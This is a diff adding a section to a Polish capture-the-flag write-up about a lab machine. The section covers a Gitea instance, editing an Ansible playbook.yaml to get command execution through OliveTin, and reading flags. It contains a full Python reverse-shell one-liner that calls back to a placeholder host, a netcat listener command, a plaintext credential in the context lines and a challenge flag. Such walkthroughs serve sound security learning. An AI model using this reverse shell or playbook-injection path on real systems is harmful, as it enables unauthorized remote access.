@@ -174,5 +174,67 @@ user: samarium
 password: TUmhyZ37CLZrhP
 ```
 
+### Port 3000
+
+Na porcie 3000 znajduje się aplikacja do hostowania kontroli wersji oprogramowania - Gitea:
+
+![Gitea](img/Gitea.JPG)
+
+Logujemy się do systemu zdobytymi danymi do logowania, w zakładce "Explore" widzimy jedno aktywne repozytorium ansible:
+
+![Explore](img/Explore.JPG)
+
+W pliku flag1.txt znajdujemy pierwszą flagę:
+
+![Flag1](img/Flag1.JPG)
+
+```
+10d916eaea54bb5ebe36b59538146bb5
+```
+
+W repozytorium znajduje się plik playbook.yaml, który możemy edytować, co daje potencjalny wektor ataku:
+
+![Playbook](img/Playbook.JPG)
+
+### Port 1337
+
+Na porcie 1337 znajduje się aplikacja, która umożliwia miedzy innymi wykonanie: backup-u, komendy ping oraz uruchomienie Ansible Playbook:
+
+![OliveTin](img/OliveTin.JPG)
+
+Wynik zakładki "Logs" po uruchomieniu Ansible Playbook:
+
+![AnsiblePlaybook](img/AnsiblePlaybook.JPG)
+
+Zmieniamy komendę w pliku playbook.yaml na "id" i ponownie uruchamiamy  Ansible Playbook:
+
+![Id](img/Id.JPG)
+
+![Stdout](img/Stdout.JPG)
+
+Widzimy, że komenda "id" wykonała się na serwerze.
+
+
+## Eksploitacja
+
+Spróbujemy uzyskać dostęp do systemu poprzez reverse shell, edytując plik playbook.yaml za pomocą komendy:
+
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```
+
+Następnie nasłuchujemy połączeń za pomocą narzędzia netcat:
+
+```
+nc -lvnp [Port]
+```
+Zyskaliśmy dostęp do serwera:
+
+![RevShell](img/RevShell.JPG)
+
+W pliku flag2.txt znajdujemy drugą flagę:
+
+![Flag2](img/Flag2.JPG)
+
 
 
